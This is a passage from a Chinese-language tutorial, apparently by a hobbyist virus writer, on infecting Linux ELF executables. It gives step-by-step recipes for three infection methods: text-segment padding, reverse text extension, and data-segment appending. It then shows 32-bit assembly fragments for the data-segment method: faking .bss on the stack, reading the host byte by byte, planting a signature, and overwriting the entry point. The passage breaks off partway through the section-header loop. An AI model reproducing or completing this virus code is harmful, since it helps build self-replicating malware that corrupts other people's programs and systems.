程序头告诉我们，哪个“段”属于TEXT段，哪个“段”属于DATA段，也给出其在文件中的偏移。
节头给出每个“节”和它们所属“段”的信息。这可能有点令人困惑。首先要明白的是一个可执行文件在磁盘上和它运行在内存中是不同的状态，而这些头给出了这两方面的相关信息。
TEXT段是可读取/执行的代码段，它包含了我们的代码和其他只读数据。
DATA段是可读/写的数据段，它包含了全局变量和动态链接的信息。
在TEXT段，有一个.text节和一个.rodata节。在DATA段中，有一个.data节和.bss节。
如果你熟悉汇编语言，这些节名应该对你来说听起来很熟悉。
.text是代码驻留的地方，.data是存储初始化全局变量的地方。.bss包含未初始化的全局变量，因为它是未初始化的，所以没有占用磁盘空间。
不像PE文件（微软的），ELF文件没有太多可以感染的区域。老式的DOS、COM文件几乎允许你在任何地方添加病毒代码，然后在100
h这个地址覆盖内存代码（因为COM文件总是在100 h的内存地址开始映射）。ELF文件不允许你写TEXT段。下面这些是ELF感染病毒的主要方法：
**感染Text段填充区**
感染.text节的尾部。我们可以利用ELF文件的特点，当其加载到内存中，尾部会被使用‘0’来填充成一个完整的内存页。受到内存页长度的限制，所以我们只能在32位系统上容纳一个4
kb病毒或在64位系统容纳2 mb病毒。这看起来可能很小，但也足够容纳用C或者汇编语言编写的小病毒。这一目标的实现方法是：
——修改入口点（ELF头）到.text节的尾部
——增加节表（ELF头）里对应节的页长度
——增加Text段的文件长度和内存长度为病毒代码的长度
——遍历每个被病毒寄生后的程序头，根据页面长度增加对应的偏移
——找到Text段的最后一个节头，增加其节长度（在节头里）
——遍历每个被病毒感染后的节头，根据页面长度增加对应的偏移
——在.text节的尾部插入实际的病毒代码
——插入病毒代码后跳转到原始宿主的入口点执行
**反向感染Text段**
在允许宿主代码保持相同虚拟地址的同时感染.text节区的前面部分。我们将反向扩展text段。在现代Linux系统中允许的最小虚拟映射地址是0x1000，这便是我们可以反向拓展text段的限制长度。在64位系统上，默认的text段虚拟地址通常是0x400000，这就有可能给病毒留下减掉ELF头长度后的大小为0x3ff000的空间。在32位系统上，默认的text段虚拟地址通常是0x0804800，这就有可能产生更大的病毒。这一目标的实现方式是：
——增加节表（在ELF头）里的偏移为病毒长度（对下一内存页对齐值取余）
——在Text段程序头里，根据病毒的长度（对下一内存页对齐值取余）减小虚拟地址（和物理地址）
——在Text段程序头里，根据病毒的长度（对下一内存页对齐值取余）增加文件长度和内存长度
——根据病毒的长度（再次取余），遍历每个程序头的偏移，增加它的值到大于text段
——修改入口点（在ELF头）到原始的text段虚拟地址——病毒的长度（再次取余）
——根据病毒的长度（再次取余），增加程序头偏移（在ELF头）
——插入病毒实体到text段的开始位置
**Data段感染**
感染数据段。我们将把病毒代码附加到data段（在.bss节之前）。因为它是数据部分，我们的病毒代码可以尽可能的大，像我们希望的那样不受约束。Data内存段的数据有一个R
+ W（读和写）的权限设置，而Text内存段有R +
X（读和执行）权限设置。在没有NX位设置的系统（如32位Linux系统）中，你可以执行Data段里的代码而不用改变权限设置。然而，其他系统需要你在病毒寄存的内存段属性中添加一个可执行的标志。
——根据病毒的长度增加节头的偏移（在ELF头）
——修改入口点（在ELF头）指向数据段的尾部（虚拟地址+文件长度）
——在数据段程序头里，根据病毒长度增加页面和内存的长度
——根据病毒的长度增加.bss节的偏移（在节头）
——设置数据段的可执行权限位（32位Linux系统不适用）。
——插入病毒实体到数据段的尾部
——插入代码，跳转到原始宿主的入口点
当然，还有更多感染的方法，但这些是首要选择。对于我们的示例，将使用上面的第三个方法。
编写病毒时还有另外一个比较大的障碍——变量。理想情况下，我们不希望合并（病毒和宿主）.data节和.bss节。此外，一旦你汇编或编译病毒，无法保证当病毒在宿主程序运行时你的变量始终在同一个虚拟地址。事实上，这几乎是不会发生的事情，那样的话宿主程序将会抛出段错误的提示。所以在理想情况下，你希望限制你的病毒到一个特定的节：.text。如果你有汇编的经验，你就明白这是一项挑战。我将和你们分享一些技巧，应该就会使这个过程更容易些。
首先，让我们关照一下.data节变量（初始化了）。如果可能的话，“硬编码”这些值。或者，假设我有我.asm代码：
    section .data
        folder db ".", 0
        len equ 2048
        filenamelen equ 32
        elfheader dd 0x464c457f     ; 0x7f454c46 -> .ELF （反转字节序）
        signature dd 0x001edd0e     ; 0x0edd1e00 反转字节序后的签名
    section .bss
        filename: resb filenamelen  ; 目标文件路径
        buffer: resb len            ; 所有的文件名
        targets: resb len           ; 目标文件名
        targetfile: resb len        ; 目标文件内容
    section .text
        global v1_start
    v1_start:
    你可以这样做：
        call signature
        dd 0x001edd0e     ; 0x0edd1e00反转字节序后的签名
    signature:
        pop ecx     ; 现在值存在ecx里了
我们利用的是，当一个call指令被调用时，调用的当前指令的绝对地址将会被压入栈内存里以期能够正常返回。
这样我们就可以遍历每个.data节里的变量然后一起解决这个问题了。
至于.bss节里的变量（未初始化的），我们需要储备一定数量的字节数据。我们在.text节里这样做因为它属于Text代码段，其属性被标记为r +
x（读取和执行），不允许在该内存段里写数据。所以我决定使用堆栈。栈？是的，一旦我们把字节压入堆栈，我们可以看到堆栈指针并保存这些标记。这里是我解决方案里的一个例子：
     ; 给未初始化的变量开辟栈内存空间以避免使用.bss节
        mov ecx, 2328   ; 设置循环计数2328 （x4=9312 bytes）. filename（esp）， buffer （esp+32）， targets （esp+1056）， targetfile （esp+2080）
    loop_bss:
        push 0x00       ; 压入4个字节（双字）的0
        sub ecx, 1      ; 计数减一
        cmp ecx, 0
        jbe loop_bss
        mov edi, esp    ; esp 有了我们要伪造的 .bss 偏移。 让我们将它存储在edi里。
注意到我一直在压入0x00字节（在32位汇编压栈一次将一个双字压入，正好是寄存器的长度）。确切地说，我们共压入2328次。这样大概给我们开辟一个大约9312字节的空间可以使用。一旦我完成所有的0字节压栈，把ESP的值（即我们的堆栈指针）存储起来，并把它作为我们“伪造.bss”的基址。我可以引用ESP
+[offset]来访问不同的变量。在我的例子中，我保存的[esp]对应filename，[esp + 32]对应buffer，[esp +
1056]对应targets，以及[esp + 2080]对应targetfile。
现在我就可以完全去除.data节和.bss节的使用了，并且整个病毒被唯一的一个.text节来承载！
readelf是一个很有用的工具。运行readelf –a[file]将会给你ELF头/程序头/节头的一些细节：
这里有三个节：.text、.data、.bss
这里我们消除了.bss节：
在这里，我们已经完全消除了.data段。我们可以用.text节来单独进行一切操作！
现在我们将需要读取宿主文件的字节数据到一个缓冲区，对头部进行必要的修改，并注入病毒标记。如果你做了给你的关于目录条目结构和保存目标文件长度的家庭作业，将对你有好处。否则，我们将不得不一个字节一个字节地读文件，直到系统读到一个在EAX返回0
x00的调用，说明我们已经达到了EOF：
    reading_loop:
        mov eax, 3              ; sys_read
        mov edx, 1              ; 一次读一个字节 （yeah， 我知道这可能是最好的）
        int 80h 
        cmp eax, 0              ; 如果返回 0，我们读到了EOF
        je reading_eof
        mov eax, edi 
        add eax, 9312          ; 2080 + 7232 （2080 targetfile在我们伪造 .bss的偏移）
        cmp ecx, eax            ; 如果文件超过 7232 字节， 退出
        jge infect
        add ecx, 1
        jmp reading_loop
    reading_eof:
        push ecx                ;保存最后读取的一个字节的地址， 我们后面需要用到它
        mov eax, 6              ;关闭文件
        int 80h
修改缓冲区是非常简单的。记住，当移动任何超出一个字节时你必需得处理反向字节顺序（小端）。
这里我们注入病毒标记并改变入口点指向我们在数据段尾部的病毒代码。（文件长度不包括的.bss在内存中占据的空间）：
    mov ebx, dword [edi+2080+eax+8]     ; phdr->vaddr （内存虚拟地址）
    add ebx, edx        ;新入口点 = phdr[data]->vaddr + p[data]->filesz
    mov ecx, 0x001edd0e     ; 在8字节处插入我们的标志（ELF头没有用到的节）
    mov [edi+2080+8], ecx
    mov [edi+2080+24], ebx  ; 用病毒覆盖旧入口点 （在buffer里）
注意到我想存储0xedd1e00（用十六进制字符编写的我的名字）的病毒标记，但反向字节顺序给了我们0x001edd0e。
你还会注意到，我用偏移算法找到通向我留给未初始化变量的栈底部区域。
现在我们需要定位DATA程序头并做一些修改。诀窍是先找到PT_LOAD类型，然后确定其偏移是不是非0。如果其偏移量为0，它就是一个TEXT程序头。否则，它就是DATA。
``
    section_header_loop：
        ; 循环通过节头来寻找.bss节（NOBITS）
        ;0  sh_name 包含一个指向给定节的名字字符串指针
        ;+4 sh_type 给定节类型 [节的名称
        ;+8 sh_flags    其他标志 ...
        ;+c sh_addr 运行时节到虚拟地址